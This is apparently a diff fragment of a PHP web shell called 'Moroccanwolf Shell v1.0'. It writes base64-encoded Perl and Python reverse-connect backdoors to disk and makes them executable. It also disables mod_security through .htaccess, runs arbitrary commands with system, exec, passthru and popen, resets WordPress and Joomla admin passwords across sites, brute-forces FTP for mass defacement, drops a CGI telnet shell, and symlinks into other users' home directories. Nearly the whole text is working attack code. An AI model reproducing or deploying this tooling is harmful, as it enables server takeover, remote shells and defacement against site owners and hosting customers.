HggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcGVybCBiY29ucGVybC5wbCBbaXBdIFtQb3J0XTwvaDM+PC9zdHJvbmc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9InZ3IiBzaXplPSI1MCIgdmFsdWU9ImNtZCI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjb21tYW5kIiBzaXplPSI0MyI+IDxzZWxlY3QgbmFtZT1leGVjbWV0aG9kPg0KPG9wdGlvbiB2YWx1ZT0ic3lzdGVtIj5TeXN0ZW08L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9ImV4ZWMiPkV4ZWM8L29wdGlvbj4gIDxvcHRpb24gdmFsdWU9InBhc3N0aHJ1Ij5QYXNzdGhydTwvb3B0aW9uPjxvcHRpb24gdmFsdWU9InBvcGVuIj5wb3Blbjwvb3B0aW9uPg0KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImtrayIgdmFsdWU9IkV4ZWN1dGUiPg0KPC9wPjwvZm9ybT4nOw0KDQo/Pg==";
-
-
-
 $file = fopen("mwolf.php" ,"w+");
 $write = fwrite ($file ,base64_decode($kkk));
 fclose($file);
 echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Perl Back-Connect (BACkDOOR)</h6></span><center><center><br><iframe src=bconperl/mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 
-
 }
-
-
 elseif(isset($_GET['bcon']) && $_GET['bcon'] == "pyt"){
-
 @mkdir('bconpython', 0755);
 @chdir('bconpython');
-
 $nnnn = "<IfModule mod_security.c>
 SecFilterEngine Off
 SecFilterScanPOST Off
 </IfModule>"; 
-
-
 $bbnn = fopen (".htaccess" , 'w+') or die ("Problem nihahahahahahahahaha !");
    
 fwrite ( $bbnn , $nnnn ) ;
 fclose ($bbnn);
 //back connect python
 $lalala ='IyEvdXNyL2Jpbi9weXRob24NCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHB0eQ0KIA0Kc2hlbGwgPSAiL2Jpbi9zaCINCiANCmRlZiB1c2FnZShwcm9ncmFtbmFtZSk6DQpwcmludCAieXRob24gY29ubmVjdC1iYWNrIGRvb3IiDQpwcmludCAiVXNhZ2U6ICVzIDxjb25uX2JhY2tfaXA+IDxwb3J0PiIgJSBwcm9ncmFtbmFtZQ0KIA0KZGVmIG1haW4oKToNCmlmIGxlbihzeXMuYXJndikgIT0zOg0KdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQpzeXMuZXhpdCgxKQ0KIA0KcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KIA0KdHJ5Og0Kcy5jb25uZWN0KChzb2NrZXQuZ2V0aG9zdGJ5bmFtZShzeXMuYXJndlsxXSksaW50KHN5cy5hcmd2WzJdKSkpDQpwcmludCAiWytdQ29ubmVjdCBPSy4iDQpleGNlcHQ6DQpwcmludCAiWy1dQ2FuJ3QgY29ubmVjdCINCnN5cy5leGl0KDIpDQogDQpvcy5kdXAyKHMuZmlsZW5vKCksMCkNCm9zLmR1cDIocy5maWxlbm8oKSwxKQ0Kb3MuZHVwMihzLmZpbGVubygpLDIpDQpnbG9iYWwgc2hlbGwNCm9zLnVuc2V0ZW52KCJISVNURklMRSIpDQpvcy51bnNldGVudigiSElTVEZJTEVTSVpFIikNCnB0eS5zcGF3bihzaGVsbCkNCnMuY2xvc2UoKQ0KIA0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCm1haW4oKQ==';
-
 $kk = fopen("bconpython.py" ,"w+");
 $write = fwrite ($kk ,base64_decode($lalala));
 fclose($kk);
-
 @chmod("bconpython.py",0755);
-
 $kkk ="
 PGh0bWw+PGhlYWQ+PHRpdGxlPkFub25HaG9zdCBQeXRob24gQ29ubmVjdCBTaGVsbCBQcml2ODwvdGl0bGU+PGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwOi8vd3d3MTQuMHp6MC5jb20vMjAxNC8wNi8wNC8yMS8zOTY1NTQzOTQucG5nIiB0eXBlPSJpbWFnZS94LWljb24iIC8+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmgzIHsNCnRleHQtZGVjb3JhdGlvbjogbm9uZTsNCiAgZm9udC1mYW1pbHk6IFRhaG9tYSwgQXJpYWwsIHNhbnMtc2VyaWY7DQogIGZvbnQtc2l6ZTogMTBweDsNCiAgY29sb3I6ICMwMDc2QjE7DQogIA0KfQ0KLmFyZWEgew0KICBjb2xvcjogIzAwNzZCMTsNCiAgZm9udC1zaXplOiA5cHQ7DQogIHRleHQtc2hhZG93OiAjMDA3NkIxIDBweCAycHggN3B4Ow0KICBib3JkZXI6IHNvbGlkIDFweCAjMDA3NkIxOw0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFuc3BhcmVudDsNCiAgYm94LXNoYWRvdzogMHB4IDBweCA0cHggIzAwOTkwMDsNCiAgcGFkZGluZzogM3B4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDRweDsNCiAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7DQogIGJvcmRlci1yYWRpdXM6IDRweDsNCiAgLXdlYmtpdC1ib3gtc2hhZG93OiByZ2IoMCwxMTksMCkgMHB4IDBweCA7DQp9DQogaW5wdXRbdHlwZT1zdWJtaXRdeyBwYWRkaW5nOiAzcHg7IGNvbG9yOiAjMDA3NzA7DQogIGZvbnQtd2VpZ2h0OiBib2xkOyANCnRleHQtYWxpZ246IGNlbnRlcjsgDQogdGV4dC1zaGFkb3c6IDAgMXB4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4zKTsNCiAgYmFja2dyb3VuZDogI2FlYWVhZTsgDQogYmFja2dyb3VuZC1jbGlwOiBwYWRkaW5nLWJveDsgDQogYm9yZGVyOiAxcHggc29saWQgIzI4NDQ3MzsgDQogYm9yZGVyLWJvdHRvbS1jb2xvcjogIzIyM2I2NjsgDQogYm9yZGVyLXJhZGl1czogNHB4OyAgDQpjdXJzb3I6IHBvaW50ZXI7ICANCmJhY2tncm91bmQtaW1hZ2U6LXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsNCiBiYWNrZ3JvdW5kLWltYWdlOiAtbW96LWxpbmVhci1ncmFkaWVudCh0b3AsICNlYWVhZWEsICNkMGQwZDApOw0KICBiYWNrZ3JvdW5kLWltYWdlOiAtby1saW5lYXItZ3JhZGllbnQodG9wLCAjZWFlYWVhLCAjZDBkMGQwKTsgDQogYmFja2dyb3VuZC1pbWFnZTogbGluZWFyLWdyYWRpZW50KHRvIGJvdHRvbSwgI2VhZWFlYSwgI2QwZDBkMCk7IA0KIC13ZWJraXQtYm94LXNoYWRvdzogaW5zZXQgMCAxcHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjUpLCBpbnNldCAwIDAgN3B4IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC40KSwgMCAxcHggMXB4IHJnYmEoMCwgMCwgMCwgMC4xNSk7ICBib3gtc2hhZG93OiBpbnNldCAwIDFweCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuNSksIGluc2V0IDAgMCA3cHggcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjQpLCAwIDFweCAxcHggcmdiYSgwLCAwLCAwLCAwLjE1KTsgfSANCg0KaW5wdXRbdHlwZT10ZXh0XXsgcGFkZGluZzogM3B4OyBjb2xvcjogIzAwNzZCMTsgdGV4dC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCAzcHg7IGJvcmRlcjogMXB4IHNvbGlkICMwMDc2QjE7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyBib3gtc2hhZG93OiAwcHggMHB4IDRweCAjMDA3NkIxOyAgICBwYWRkaW5nOiAzcHg7ICAgLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA0cHg7ICAgLW1vei1ib3JkZXItcmFkaXVzOiA0cHg7ICAgYm9yZGVyLXJhZGl1czogNHB4OyAgIC13ZWJraXQtYm94LXNoYWRvdzogcmdiKDg1LDg1LDg1KSAwcHggMHB4IDRweDsgICAtbW96LWJveC1zaGFkb3c6ICMwMDc2QjEgMHB4IDBweCA0cHg7fSANCg0KDQoNCg0KPC9zdHlsZT4NCjw/cGhwDQplY2hvICcNCjxjZW50ZXI+DQo8Zm9ybSBtZXRob2Q9R0VUPg0KPHA+PHRleHRhcmVhIGNsYXNzPSJhcmVhIiByb3dzPSIxMyIgbmFtZT0idGV4dCIgdmFsdWU9InB5dCIgY29scz0iNzAiID4nOw0KDQoNCmlmIChzdHJsZW4oJF9HRVRbJ2NvbW1hbmQnXSk+MSAmJiAkX0dFVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9HRVRbJ2V4ZWNtZXRob2QnXSgkX0dFVFsnY29tbWFuZCddKTt9DQppZiAoc3RybGVuKCRfUE9TVFsnY29tbWFuZCddKT4xICYmICRfUE9TVFsnZXhlY21ldGhvZCddIT0icG9wZW4iKXsNCmVjaG8gJF9QT1NUWydleGVjbWV0aG9kJ10oJF9QT1NUWydjb21tYW5kJ10pO30NCg0KaWYgKHN0cmxlbigkX0dFVFsnY29tbWFuZCddKT4xICYmICRfR0VUWydleGVjbWV0aG9kJ109PSJwb3BlbiIpew0KcG9wZW4oJF9HRVRbJ2NvbW1hbmQnXSwiciIpO30NCg0KZWNobyc8L3RleHRhcmVhPjwvcD4NCjxwPjxjZW50ZXI+PC9jZW50ZXI+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+PHN0cm9uZz48aDM+Q29tbWFuZDogcHl0aG9uIGJjb25weXRob24ucHkgW2lwXSBbUG9ydF08L2gzPjwvc3Ryb25nPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPSJ2dyIgc2l6ZT0iNTAiIHZhbHVlPSJjbWQiPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iY29tbWFuZCIgc2l6ZT0iNDMiPiA8c2VsZWN0IG5hbWU9ZXhlY21ldGhvZD4NCjxvcHRpb24gdmFsdWU9InN5c3RlbSI+U3lzdGVtPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJleGVjIj5FeGVjPC9vcHRpb24+ICA8b3B0aW9uIHZhbHVlPSJwYXNzdGhydSI+UGFzc3RocnU8L29wdGlvbj48b3B0aW9uIHZhbHVlPSJwb3BlbiI+cG9wZW48L29wdGlvbj4NCjwvc2VsZWN0PiA8aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJra2siIHZhbHVlPSJFeGVjdXRlIj4NCjwvcD48L2Zvcm0+JzsNCg0KPz4=";
-
 $file = fopen("mwolf.php" ,"w+");
 $write = fwrite ($file ,base64_decode($kkk));
 fclose($file);
 echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great; color:#009900"><h6>Python Back-Connect</h6></span><center><center><br><iframe src=bconpython/mwolf.php width=75% height=70% frameborder=0></iframe></div></center>'; 
-
 }
 elseif(isset($_GET['bcon']) && $_GET['bcon'] == "smp")
     {
      if (isset($_POST['done']) &&   $_POST['port'] != "" &&  $_POST['ip'] != ""){
         ini_set('max_execution_time',0);
-
         echo "<p><h3>The Program is now trying to connect!</h3></p>";
         $ip = $_POST['ip']; 
         $port=$_POST['port']; 
@@ -1391,35 +1068,25 @@ elseif(isset($_GET['bcon']) && $_GET['bcon'] == "smp")
     </table>
   
 <?php
-
     
 }
-
-
 }
 echo '
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
-
 }
 if (isset($_GET['about'])){
-
 echo '
 <img src="https://cdn0.iconfinder.com/data/icons/animal-archetypes/512/wolf-512.png" width="300" height="235" />
 <h5>This Shell Has Been Coded By Moroccanwolf (Moroccan Programmer)<br>
-
                                         I\'m a 15 years old security fan, I like to understand things in depth, for me, the real knowledge is not defacing, I now think you\'ll waste your time, by putting a page
                                                         \'Hacked by xxx, nothing system is secure\' the real knowledge in hacking has no limits, for me the real hacking is a way of thinking, a way of liking understand things in depth, like learning C language (PHP has mainly been coded in C,
                                                         your operating system has mainly been coded in C). A real hacker knows his computer\'s secrets, defacing is a shame on this world, however, it\'s one of my interest, I just say this to show to you i\'m awake of what I did and what I\'ll probably continune to do when I
                                                         have free time
-
 </h5>
 <br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
-
 }
-
-
 if (isset($_GET['mass'])){
 echo '
 <br>
@@ -1428,9 +1095,7 @@ echo '
 <a href="?mass=wp">Mass Login Wordpress</a><br><br>
 <a href="?mass=jom">Mass Login Jommla</a><br><br>
 <a href="?mass=dir">Mass Deface Dir</a><br><br>';
-
 if(isset($_GET['mass']) && $_GET['mass'] == "dir"){
-
 echo "<h6>Mass Directory:</h6>";
 echo "<center><textarea rows='10' cols='100'>";
 $defaceurl = $_POST['massdefaceurl'];
@@ -1468,7 +1133,6 @@ echo "</textarea></center>";
 <?php
 }
 elseif(isset($_GET['mass']) && $_GET['mass'] == "jom"){
-
 echo '
  
  <center><h6>Mass Joomla :</h6> <form class="wolf1" action="" method="POST">
@@ -1482,7 +1146,6 @@ echo '
                           $str = substr($str,0,$end_pos);
                           return $str;    
                                        }  
-
       $config = $_POST['config'];
                         $user = $_POST['user']; 
                         $pass = $_POST['pwd']; 
@@ -1506,16 +1169,11 @@ echo '
         $query3  = @mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
         
       echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 
-
 false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font 
-
 color="green">success..</font><br>';
-
       }else{
         echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 
-
 false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>Joomla</a></td><td><font color="red">mysql 
-
 fail</font></td>';
       }
       
@@ -1523,15 +1181,11 @@ fail</font></td>';
     
 }
       
-
-
 elseif(isset($_GET['mass']) && $_GET['mass'] == "wp"){
-
 echo '
  
  <center><h6>Mass Wordpress :</h6> <form class="wolf1" action="" method="POST">
 <table><tbody><tr><td>config :</td><td><input size="26" class="inputz" type="text" name="config" value=""></td></tr><tr><td>user:</td><td><input class="inputz" type="text" name="user" size="26" value="admin"></td></tr><tr><td>pwd:</td><td><input class="inputz" type="text" size="26" name="pwd" value="wolf"></td></tr><tr><td>Kill : </td><td><input class="inputzbut" type="submit" name="fuck" value=" change "></td></tr></tbody></table></form></center>';
-
                      function Find($str,$start,$end){
                           $len = strlen($str);
                           $start_pos = (strpos($str,$start) + strlen($start));
@@ -1540,14 +1194,12 @@ echo '
                           $str = substr($str,0,$end_pos);
                           return $str;    
                                        }  
-
         
       $config = $_POST['config'];
                         $nuser = $_POST['user']; 
                         $npwd = $_POST['pwd']; 
                         if (isset($_POST['fuck'])){
                         
-
       $cnf = file_get_contents($config);
       $hostname = Find($cnf,"define('DB_HOST', '","');");
       $username = Find($cnf,"define('DB_USER', '","');");
@@ -1571,16 +1223,12 @@ echo '
         
         error_reporting(0);
         echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 
-
 false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$site_url.'/wp-login.php>'.$site_url.'/wp-login.php</a></td><td><font 
-
 color="green"> =>success..</font></td>';
         
       }else{
         echo '<tr><td><a href='.$url.' onclick="window.open(this.href);return 
-
 false;">'.$domain.'</a></td><td>'.$owner['name'].'</td><td><a href='.$config.'>WordPress</a></td><td><font color="red">mysql 
-
 fail</font></td>';
       }
     
@@ -1590,11 +1238,7 @@ fail</font></td>';
     
 }
     
-
 }
-
-
-
 elseif ($_GET['mass'] == "cp"){
 ?>
 
@@ -1615,18 +1259,12 @@ Index File Name:<input type="text" name="index_name" value="index.txt" /><br>
 </form>
 
 <?php
-
-
 set_time_limit(0);
-
 if(isset($_POST['forest'])){
-
 $ip=trim($_POST['ip']);
 $users = explode("\n",$_POST["users"]);
 $passwords = explode("\n",$_POST["passwords"]);
 $index_name=trim($_POST['index_name']);
-
-
 foreach($users as $user){
 foreach($passwords as $pass){
 $connect_ip = ftp_connect($ip) or die("<h3>Couldn't Connect To $ip</h3>");
@@ -1649,9 +1287,6 @@ echo"<p>&nbsp;</p>";
 echo "<br><font size=5><h3> ! Mass Defacing Was Done ! </h3></font>";
 echo"<p>&nbsp;</p>";
 }
-
-
-
 ?>
 
 
@@ -1661,22 +1296,16 @@ echo"<p>&nbsp;</p>";
 echo '
 <br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
-
-
 }
-
 if (isset($_GET['cgi'])){
 echo '<h6>CgiShell</h6><div class=content>';
-
 @mkdir('cgitelnet1', 0755);
     chdir('cgitelnet1');
         $kokdosya = ".htaccess";
         $dosya_adi = "$kokdosya";
         $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
         $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI
-
 AddType application/x-httpd-cgi .cin
-
 AddHandler cgi-script .cin
 AddHandler cgi-script .cin";
         fwrite ( $dosya , $metin ) ;
@@ -2047,7 +1676,6 @@ ZXEgInVwbG9hZCIpICMgdXNlciB3YW50cyB0byB1cGxvYWQgYSBmaWxlDQp7DQoJJlVwbG9hZEZp
 bGU7DQp9DQplbHNpZigkQWN0aW9uIGVxICJkb3dubG9hZCIpICMgdXNlciB3YW50cyB0byBkb3du
 bG9hZCBhIGZpbGUNCnsNCgkmRG93bmxvYWRGaWxlOw0KfQ0KZWxzaWYoJEFjdGlvbiBlcSAibG9n
 b3V0IikgIyB1c2VyIHdhbnRzIHRvIGxvZ291dA0Kew0KCSZQZXJmb3JtTG9nb3V0Ow0KfQ==';
-
 $file = fopen("izo.cin" ,"w+");
 $write = fwrite ($file ,base64_decode($cgishellizocin));
 fclose($file);
@@ -2069,28 +1697,20 @@ JlNFUlZFUiIpOw0KICAgICAgICBvcGVuKFNURE9VVCwiPiZTRVJWRVIiKTsNCiAgICAgICAgb3Bl
 bihTVERFUlIsIj4mU0VSVkVSIik7DQogICAgICAgIGV4ZWMgeycvYmluL3NoJ30gJy1iYXNoJyAu
 ICJcMCIgeCA0Ow0KICAgICAgICBleGl0KDApOw0KICAgICAgfQ0KICAgICAgcHJpbnQgIlsqXSBE
 YXRhY2hlZFxuXG4iOw==';
-
 $file = fopen("dc.pl" ,"w+");
 $write = fwrite ($file ,base64_decode($netcatshell));
 fclose($file);
     chmod("dc.pl",0755);
    echo "<iframe src=cgitelnet1/izo.cin width=100% height=100% frameborder=0></iframe> ";
-
-
 echo '
 <br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>
 ';
 }
-
-
 if (isset($_GET['sym'])){
 echo "<h6>Symlink Bypass </h6>";
 echo '<form action="" method="post">';
-
 @set_time_limit(0);
-
 echo "<center>";
-
 @mkdir('sym',0777);
 $htaccess  = "Options all \n DirectoryIndex readme.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
 $write =@fopen ('sym/.htaccess','w');
@@ -2131,35 +1751,26 @@ $name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string
 }
 echo "
 <tr>
-
 <td>
 <div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
 </td>
-
 <td>
 '.$UID['name']."
 </td>
-
 <td>
 <a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
 </td>
-
 </tr></div> ";
-
 }
 }
 }
 }
-
 echo "</table>";   
-
 echo '
 <br><br><br><br><h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3></center>
 ';
 }
-
 if (isset($_GET['kill'])){
-
 echo '<center><h3>Do you really want to delete this shell ?</h3></center><br><br>';
 ?>
 <center><b><a style="color:#ff0000;" href="?kill=killit"><h3>Yes</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
@@ -2167,38 +1778,29 @@ echo '<center><h3>Do you really want to delete this shell ?</h3></center><br><br
 
 <?php
 }
-
 if(isset($_GET['kill']) && $_GET['kill'] == "killit"){
 $file = $_SERVER['PHP_SELF'];
 if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
 die('<br><br><b class="tmp"><font color="#ff0000" size="2pt"><center><h3>Shell has been Killed...Take Care And Stay Safe</h3></center></font></b><meta http-equiv="refresh" content="3; url=?".$pwd."" />');
 else
 echo '<font color="#fff600" size="2pt"><h3>unlink error!</h3></font>';
-
 }
-
 if (isset($_GET['home'])){
-
 $ip = gethostbyname($_SERVER["HTTP_HOST"]);
-
 echo "<h4>server ip : $ip </h4><br> <h1> Moroccanwolf Shell v1.0 </h1><h4>Coded by Moroccanwolf | Team : Gcc-r00t.net</h4><h3>Facebook Page : https://www.facebook.com/Mwolfprogrammer </h3><br><h3>Greetz : Abdellah Elmaghribi - Hw 05 - x-agent - Virusx El - bl4ck-dz - Matrix Dz - Dr.Gilius - Kuroi'SH - MuhmadEmad - Bajtax  - Moh Ooasiic - Anas P!co - Gcc-r00t Members - Newbies  - All Moroccan Hackers  - Moroccan Resistance Team - My computer </h3> ";
 echo "<br>
 <h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
 }
-
 if (isset($_GET['upload'])){
     echo"<br><br><form method=post enctype=multipart/form-data>"; 
     echo"<input type=file name=f><input name=v type=submit id=v value=up><br>"; 
       if($_POST["v"]==up)
 { if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<h3><b>Uploaded Done</b>-->".$_FILES["f"]["name"]."</h3>";}else{echo"<b>Not Uploaded";}}
-
 echo "<br><br><br><br><br><br><br><br><br>
 <h3>This Script Has Been Coded by Moroccanwolf  2015-2016  | Gcc-r00t.Net</h3>";
  }
-
 function perms($file){
     $perms = fileperms($file);
-
 if (($perms & 0xC000) == 0xC000) {
     // Socket
     $info = 's';
@@ -2224,21 +1826,18 @@ if (($perms & 0xC000) == 0xC000) {
     // Unknown
     $info = 'u';
 }
-
 // Owner
 $info .= (($perms & 0x0100) ? 'r' : '-');
 $info .= (($perms & 0x0080) ? 'w' : '-');
 $info .= (($perms & 0x0040) ?
             (($perms & 0x0800) ? 's' : 'x' ) :
             (($perms & 0x0800) ? 'S' : '-'));
-
 // Group
 $info .= (($perms & 0x0020) ? 'r' : '-');
 $info .= (($perms & 0x0010) ? 'w' : '-');
 $info .= (($perms & 0x0008) ?
             (($perms & 0x0400) ? 's' : 'x' ) :
             (($perms & 0x0400) ? 'S' : '-'));
-
 // World
 $info .= (($perms & 0x0004) ? 'r' : '-');
 $info .= (($perms & 0x0002) ? 'w' : '-');
@@ -2246,7 +1845,6 @@ $info .= (($perms & 0x0001) ?
             (($perms & 0x0200) ? 't' : 'x' ) :
             (($perms & 0x0200) ? 'T' : '-'));
     return $info;}
-
 echo '</h3>';
 echo '<h3>';
 echo '</td></tr><tr><td>';
@@ -2319,8 +1917,6 @@ if(isset($_GET['filesrc'])){
     }
 echo '</h3>';
  if(isset($_GET['file'])){
-
-
     echo '</center>';
     @$scandir = scandir($path);
     echo '<div id="content"><table width="1285" border="0" cellpadding="3" cellspacing="1" align="center">
@@ -2332,11 +1928,8 @@ echo '</h3>';
     </tr>';
     
      if(!is_writable($_GET['path'])){
-
-
 } else{
     foreach($scandir as $dir){
-
         if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
         echo "<tr>
         <td><a href=\"?file&path=$path/$dir\">$dir</a></td>
@@ -2372,7 +1965,6 @@ echo '</h3>';
         }else{
             $size = $size.' KB';
         }
-
         echo "<tr>
         <td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
         <td><center>".$size."</center></td>
@@ -2404,5 +1996,4 @@ echo "<br><br>
  }
    }
       }
-
 ?>
